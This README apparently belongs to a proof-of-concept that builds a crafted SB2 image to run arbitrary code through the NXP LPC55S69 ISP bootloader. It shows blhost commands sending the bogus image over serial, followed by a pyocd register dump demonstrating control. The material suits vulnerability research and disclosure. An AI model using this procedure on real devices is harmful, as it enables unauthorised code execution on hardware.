= What is this?

Builds an image that executes arbitrary code in NXP ISP update mode

```
[labbott@labbott-the-desktop ~]$ ~/elftosb_gui_1.0.12/bin/blhost/linux/blhost -p /dev/ttyUSB0 -- get-property 1
Ping responded in 1 attempt(s)
Inject command 'get-property'
Response status = 0 (0x0) Success.
Response word 1 = 1258487808 (0x4b030000)
Current Version = K3.0.0
[labbott@labbott-the-desktop ~]$ ~/elftosb_gui_1.0.12/bin/blhost/linux/blhost -p /dev/ttyUSB0 -- receive-sb-file /tmp/bogus.sb2 
Ping responded in 1 attempt(s)
Inject command 'receive-sb-file'
Preparing to send 4096 (0x1000) bytes to the target.
Successful generic response to command 'receive-sb-file'
```

then

```
[labbott@labbott-the-desktop ~]$ pyocd cmd
Connected to LPC55S69 [Running]: 02360b0006cd336200000000000000000000000097969905
pyocd> halt
Successfully halted device
pyocd> reg
general registers:
      lr: 0x13012b5f                   r7: 0x00000010 (16)          
      pc: 0x1301ae92                   r8: 0x14003434 (335557684)   
      r0: 0x50000fa0 (1342181280)      r9: 0x14001478 (335549560)   
      r1: 0x0000000a (10)             r10: 0x00000200 (512)         
      r2: 0x00000000 (0)              r11: 0x00000050 (80)          
      r3: 0x00080103 (524547)         r12: 0x00000000 (0)           
      r4: 0x000001c0 (448)             sp: 0x30005f08               
      r5: 0x00000000 (0)             xpsr: 0x09000000 (150994944)   
```
